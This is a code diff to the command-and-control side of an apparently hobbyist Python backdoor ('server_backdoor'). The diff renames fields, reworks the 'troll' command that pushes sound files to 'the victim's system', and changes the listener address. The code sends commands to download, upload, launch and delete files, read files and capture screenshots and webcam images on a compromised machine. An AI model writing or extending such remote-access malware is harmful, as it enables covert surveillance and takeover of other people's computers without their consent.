@@ -6,12 +6,11 @@ import work_manager as wm
 
 class server_backdoor:
     work_manager = wm.manager()
-    required_arguments_commands = ["download", "troll", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
+    required_arguments = ["download", "troll", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
 
-    TROLL_PATH = os.getcwd() +  "\Backdoor\SFX\\"
-    hacked_sfx = TROLL_PATH + "CrazyLaugh.wav"
-    print(hacked_sfx)
-    troll_sfx = TROLL_PATH + "RunningAway.wav"
+    TROLL_PATH = os.getcwd() +  "\SFX\\"
+    HACKED_SFX = TROLL_PATH + "CrazyLaugh.wav"
+    TROLL_SFX = TROLL_PATH + "RunningAway.wav"
 
     screenshot_counter = 1
     webcam_counter = 1
@@ -102,7 +101,7 @@ class server_backdoor:
 
     def is_valid(self, cmd_0, rest_of_command):
         #We are checking if the user wrote something that requires argument and if he really provided 
-        for i in self.required_arguments_commands:
+        for i in self.required_arguments:
             if cmd_0 == i:
                 if len(rest_of_command) == 0:
                     return False
@@ -171,25 +170,28 @@ class server_backdoor:
                         file_content = self.read_file(file_path)
                         command.append(file_content)
                     elif command_0 == "troll":
-                        if rest_of_command == "1":   #Hacked version
-                            if os.path.exists(self.hacked_sfx) and os.path.isfile(self.hacked_sfx):
-                                print("[+] Uploading necessary files to the victim's system.")
-                                
-                                sfx_content = self.read_file(self.hacked_sfx)
-                                command.append(sfx_content)
-                            else:
-                                print("[-] You are missing HackingSFX.")
-                        elif rest_of_command == "2":     #Troll version
-                            if os.path.exists(self.troll_sfx) and os.path.isfile(self.troll_sfx):
-                                print("[+] Uploading necessary files to the victim's system.")
-
-                                sfx_content = self.read_file(self.troll_sfx)
-                                command.append(sfx_content)
-                            else:
-                                print("[-] You are missing TrollSFX.")
-
+                        if rest_of_command != "2" and rest_of_command != "1":
+                            print("[-] (Server) no such parameters for troll.")
+                            continue
                         else:
-                            print("[-] (Server) No such parameter for troll.")
+                            if rest_of_command == "1":   #Hacked version
+                                if os.path.exists(self.HACKED_SFX) and os.path.isfile(self.HACKED_SFX):
+                                    print("[+] Uploading necessary files to the victim's system.")
+                                    
+                                    sfx_content = self.read_file(self.HACKED_SFX)
+                                    command.append(sfx_content)
+                                else:
+                                    print("[-] You are missing HackingSFX.")
+                                    continue
+                            elif rest_of_command == "2":     #Troll version
+                                if os.path.exists(self.TROLL_SFX) and os.path.isfile(self.TROLL_SFX):
+                                    print("[+] Uploading necessary files to the victim's system.")
+
+                                    sfx_content = self.read_file(self.TROLL_SFX)
+                                    command.append(sfx_content)
+                                else:
+                                    print("[-] You are missing TrollSFX.")
+                                    continue
 
                     result = self.execute_remotely(command)
                     if "[-]" not in result:                        
@@ -201,11 +203,11 @@ class server_backdoor:
                         elif command_0 == "webcam":
                             result = self.write_webcam_snap(result)
                 else:
-                    result = "You wrote incorrectly the command, for help write help."                    
+                    result = "[-] (Server) You wrote incorrectly the command, for help write help."                    
             except Exception as e:
                 result = "\n[-] (Server) Error during command execution: {}.".format(e)
  
             print(result)
 
-server = server_backdoor("192.168.1.109", 4444)
+server = server_backdoor("192.168.1.112", 4444)
 server.run()
